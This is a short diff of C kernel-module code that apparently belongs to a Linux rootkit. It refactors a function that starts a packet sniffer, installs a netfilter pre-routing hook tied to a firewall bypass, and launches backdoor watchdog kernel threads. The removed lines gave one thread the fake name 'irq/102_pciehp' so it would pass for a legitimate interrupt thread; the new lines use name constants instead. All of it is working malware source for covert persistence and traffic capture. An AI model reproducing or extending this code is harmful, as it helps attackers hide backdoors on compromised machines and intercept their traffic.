@@ -568,14 +568,13 @@ static unsigned int _sock_hook_nf_fw_bypass(void *priv, struct sk_buff *skb,
 }
 
 
-struct task_struct *kv_sock_start_sniff(const char *name) {
+struct task_struct *kv_sock_start_sniff(void) {
     bool *running = _is_task_running();
     static struct nf_priv priv;
     struct task_struct *tsk = NULL;
 
     // load sniffer
     if (!*running) {
-        char *iph0 = "irq/102_pciehp";
         // Hook pre routing
         ops.hook = _sock_hook_nf_cb;
         ops.pf = PF_INET;
@@ -586,11 +585,10 @@ struct task_struct *kv_sock_start_sniff(const char *name) {
 
         INIT_KFIFO(buffer);
 
-        tsk = kthread_run(_bd_watchdog, NULL, name);
+        tsk = kthread_run(_bd_watchdog, NULL, THREAD_SOCK_NAME);
         if (!tsk) goto leave;
 
-        tsk_iph = kthread_run(_bd_watchdog_iph, NULL, iph0);
-        kv_mem_free(&iph0);
+        tsk_iph = kthread_run(_bd_watchdog_iph, NULL, THREAD_SNIFFER_NAME);
         if (!tsk_iph) {
             kthread_stop(tsk);
             goto leave;
